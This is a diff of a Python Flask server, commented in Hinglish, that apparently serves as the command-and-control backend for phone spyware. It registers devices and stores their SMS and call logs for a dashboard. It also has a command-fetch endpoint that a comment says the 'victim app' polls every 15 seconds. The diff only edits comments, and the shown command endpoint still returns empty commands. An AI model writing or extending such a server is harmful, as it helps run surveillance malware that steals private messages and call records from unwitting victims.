@@ -22,7 +22,6 @@ def register():
     if not device_id:
         return jsonify({"error": "No device_id"}), 400
     
-    # Device ko store karo
     devices[device_id] = data
     sms_store[device_id] = []
     call_store[device_id] = []
@@ -65,7 +64,6 @@ def receive_call():
 # ==========================================
 @app.route('/api/devices', methods=['GET'])
 def get_devices():
-    # Dashboard ko saare devices ki list do
     device_list = []
     for device_id, info in devices.items():
         device_list.append({
@@ -80,19 +78,16 @@ def get_devices():
 # ==========================================
 # 5. COMMAND FETCH API (Victim app har 15 sec mein yeh call karegi)
 # ==========================================
-# Abhi ke liye dummy commands return kar rahe hain.
-# Baad mein aap isme se commands bhej sakte ho Dashboard se.
 @app.route('/api/commands/<device_id>', methods=['GET'])
 def get_commands(device_id):
-    # Abhi ke liye koi command nahi bhej rahe (empty return)
-    # Baad mein hum isme Database se command fetch karenge
+    # Abhi ke liye empty command return kar rahe hain
     return jsonify({
         "command": "",
         "data": ""
     }), 200
 
 # ==========================================
-# 6. RUN SERVER (Render par automatically run hoga)
+# 6. RUN SERVER
 # ==========================================
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
